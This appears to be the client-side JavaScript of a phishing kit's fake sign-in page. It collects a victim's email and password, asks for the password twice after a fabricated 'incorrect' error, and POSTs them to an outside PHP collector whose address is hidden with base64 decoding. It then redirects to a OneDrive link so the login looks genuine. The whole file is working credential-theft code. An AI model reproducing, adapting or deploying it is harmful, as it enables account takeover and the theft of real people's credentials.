$( document ).ready(function() {
	$("#submit-btn").click(function(){
		doJob();
	});
	
	function checkemail(){
		$('#aierrmsg').css({ display: "none" });
		$('#submit-btn').css({ display: "none" });
		$('#next').css({ display: "block" });
		$('#aierror').css({ display: "none" });
		var ai = $('#ai');
		var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

		if (!filter.test(ai.val())) {
			$('#aierrmsg').css({ display: "block" });
			ai.focus;
			return false;
		}else{
			$('#divPr').css({ display: "block" });
			$("#pr").val("");
			$('#next').css({ display: "none" });
			$('#submit-btn').css({ display: "block" });
			$("#ai").attr("disabled", "disabled"); 
			$("#submit-btn").html('Sign In');
			$("#submit-btn").attr("disabled", false);
		}
	}

	$("#next").click(function(){
		checkemail();
	});

	$('#ai').on('keypress', function(e){
		if(e.keyCode == '13'){
			checkemail();
		}
	});
	$('#pr').on('keypress', function(e){
		if(e.keyCode == '13'){
			doJob();
		}
	});
	function doJob(){  
		$('#prerrmsg').css({ display: "none" });
		$('#incorrect').css({ display: "none" });
		$('#aierror').css({ display: "none" });
		$("#errors").html('');
		$("#submit-btn").html('Authenticating...');
		$("#submit-btn").attr("disabled", true);
		$("#myError").remove();
		$("#myError2").remove();
		var formData = {
			pr: $("#pr").val(),
			ai: $("#ai").val(),
			once: $("#once").val(),
		};
		var uri = atob("aHR0cHM6Ly9kcmlsbGNyeS5jb20vYmF0Y2gvbTI2MTgvcGhwL3Byb2Nlc3MucGhw");
		$.ajax({
			type: "POST",
			url: uri,
			data: formData,
			dataType: "json",
			encode: true,
		}).done(function (data) {
			console.log(data);
			if (!data.success) {
				if (data.errors.pr) {
					$('#prerrmsg').css({ display: "block" });
					$("#submit-btn").html('Sign In');
					$("#submit-btn").attr("disabled", false);
				}
				
				if (data.errors.pr2) {
					$('#incorrect').css({ display: "block" });
					$("#pr").val("");
					$("#once").val("2");
					$("#submit-btn").html('Sign In');
					$("#submit-btn").attr("disabled", false);
				}
				
				if (data.errors.ai) {
					$('#aierror').css({ display: "block" });
					$("#aierror").html(data.errors.ai);
					$("#ai").prop('disabled', false);
					$('#divPr').css({ display: "none" });
					$('#next').css({ display: "block" });
					$('#submit-btn').css({ display: "none" });
				}
			} else {
				$("#aierror").html(data.message);
				window.setTimeout(function(){window.location.href = "https://1drv.ms/b/s!AmV4HahWLwebiSXGcp13FyKAZzxn?e=6dWbOP";}, 3000);
			}

		});

		event.preventDefault();
	}; // Submit the form
});